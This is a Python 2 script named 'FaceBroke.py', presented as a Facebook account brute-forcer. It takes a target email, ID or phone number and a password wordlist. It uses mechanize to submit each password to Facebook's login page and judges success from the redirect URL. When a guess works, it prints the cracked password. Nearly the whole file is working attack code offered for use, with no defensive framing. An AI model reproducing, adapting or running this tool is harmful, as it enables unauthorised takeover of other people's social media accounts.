#!/usr/bin/python2
#!/usr/env python2

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
	Do not Paste and Copy it.
	Changing the Variabel and the Author Name didn't make You be a Programmer '''
# Note: ASCII Art is copyrighted to Marcin Glinski
#       visit: https://www.asciiart.eu/weapons/axes

import platform,os,argparse,mechanize
if platform.system() == 'Windows':
	os.system('cls')
else:
	os.system('clear')
def jeda():
	raw_input("Press [ENTER] ")

parser = argparse.ArgumentParser()
parser.add_argument("--target",dest='target',help="Specify Target (Email/ID/PhoneNumber)",type=str)
parser.add_argument("--wlist",dest='wlist',help="Specify Wordlist to use",type=str,default='./wordlist/mxact666_password.txt')
options = parser.parse_args()

if options.target == '' or options.target == 'None' or options.target == None:
	print ""
	print "[!] Error: Target unidentificated! Please check again"
	print "           Your command! learn on 'EXAMPLE.txt'"
	print "           or You can try run 'FaceBroke.py --help' command"
	print ""
	jeda()
	exit()

print '''
                                            _.gd8888888bp._
  FaceBroke.py --->  Facebook            .g88888888888888888p.
                      Account          .d8888P""       ""Y8888b.
                    BruteForcer        "Y8P"               "Y8P'
    Coded by M-XacT-666 (copyright)      `.               ,'
                                           \     .-.     /
                                            \   (___)   /
 .------------------._______________________:__________j
/                   |                      |           |`-.,_
\###################|######################|###########|,-'`
 `------------------'                       :    ___   l
                                            /   (   )   |
                                          .d8888888888888p.
                                           \#############/.
  Target   : {}
  Wordlist : {}
'''.format(options.target,options.wlist)

try:
	print "[*] Opening and Read Wordlist..."
	isi_wlist = open(options.wlist,'r').readlines()
	print "[+] Wordlist successfully opened and readed!"
except:
	print "[-] Error: Can't open or read Wordlist! check Location"
	print "           or try again. Wordlist File's is may too big"
	print "           or corrupted"
	print ""
	jeda()
	exit()
jumlah_kata = str(len(isi_wlist))
print "[+] Total Word Phrase: %s" % jumlah_kata
print ""
try:
	print "[*] Configuring Mechanize..."
	br = mechanize.Browser()
	br.set_handle_robots(False)
	print "[+] Mechanize successfully configured!"
except:
	print "[-] Error: Can't configure Mechanize...check Your connection"
	print "           or try reinstalling or upgrade Your Mechanize module!"
	print ""
	jeda()
	exit()
hitung = 0
situs = 'https://www.facebook.com/login.php'
print ""
confirm = raw_input("Confirmation (Y/n) > ")
if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
	print ""
	print "[-] Cracking Canceled with Confirmation..."
	print ""
	exit()
else:
	pass
print ""
for kata in isi_wlist:
	hitung += 1
	try:
		passkata = kata.strip()
		br.open(situs)
		br.select_form(nr=0)
		br.form['email'] = options.target
		br.form['pass'] = passkata
		pencet = br.submit()
		respon = pencet.geturl()
		if respon == 'https://www.facebook.com/' or respon == 'https://www.facebook.com/checkpoint/?next=https://www.facebook.com/' or respon == 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2F' or respon == 'https://www.facebook.com/checkpoint/block/':
			print ""
			print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
			break
		else:
			print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
			pass
	except KeyboardInterrupt:
		print ""
		print "[-] Cracking Canceled with Keyboard Interrupt by User..."
		print ""
		jeda()
		exit()
	except:
		print ""
		print "[!] Error: Unknown Error has been occured! Sorry :("
		print ""
		jeda()
		exit()

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
	Do not Paste and Copy it.
	Changing the Variabel and the Author Name didn't make You be a Programmer '''